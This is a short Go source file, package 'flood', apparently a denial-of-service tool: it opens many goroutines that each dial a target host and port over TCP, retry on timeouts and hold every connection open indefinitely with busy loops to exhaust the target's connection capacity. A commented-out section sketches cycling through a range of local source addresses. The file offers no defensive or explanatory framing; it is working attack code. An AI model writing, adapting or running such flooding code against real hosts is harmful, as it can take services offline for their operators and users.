package flood

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

const (
	StopCharacter = "\r\n\r\n"
)

func Flood(ip string, port int, localIP string) {
	target := fmt.Sprintf("%s:%d", ip, port)

	dialer := net.Dialer{
		Timeout: time.Duration(500) * time.Millisecond,
		LocalAddr: &net.TCPAddr{
			IP:   net.ParseIP(localIP), //added via ifconfig lo0 alias 127.0.4.1 to netstat
			Port: 0,                    //0 => random free port
		}}

	conn, err := dialer.Dial("tcp", target)

	if err != nil {
		if strings.Contains(err.Error(), "i/o timeout") {
			time.Sleep(time.Duration(500) * time.Millisecond)
			Flood(ip, port, localIP)
		} else {
			//fmt.Println(port, "closed")
			fmt.Println(err)
		}

		return
	}

	fmt.Println(conn.LocalAddr())

	for {
	} //we do not want to close the connection
}

func Do(localIP string, ip string, port int, size int) {
	//localIP := "1.0.0.255"

	/** follwoing stuff can not be established at the moment cause of needles to configure personal netstats
	//ip1 := ip2Long("221.177.0.0")
	//ip2 := ip2Long("221.177.7.255")
	ip1 := ip2Long("192.168.2")
	ip2 := ip2Long("192.168.2.114")
	//x := ip2 - ip1
	for i := ip1; i <= ip2; i++ {
		i := int64(i)
		myIP := backtoIP4(i)
		//fmt.Println(backtoIP4(i))
		go Flood(ip, port, myIP)
	}**/

	for i := 0; i < size; i++ {
		go Flood(ip, port, localIP)
	}

	for {
	} //we do not want to close the connection
}

func ip2Long(ip string) uint32 {
	var long uint32
	binary.Read(bytes.NewBuffer(net.ParseIP(ip).To4()), binary.BigEndian, &long)
	return long
}

//number to IP
func backtoIP4(ipInt int64) string {
	// need to do two bit shifting and “0xff” masking
	b0 := strconv.FormatInt((ipInt>>24)&0xff, 10)
	b1 := strconv.FormatInt((ipInt>>16)&0xff, 10)
	b2 := strconv.FormatInt((ipInt>>8)&0xff, 10)
	b3 := strconv.FormatInt((ipInt & 0xff), 10)
	return b0 + "." + b1 + "." + b2 + "." + b3
}
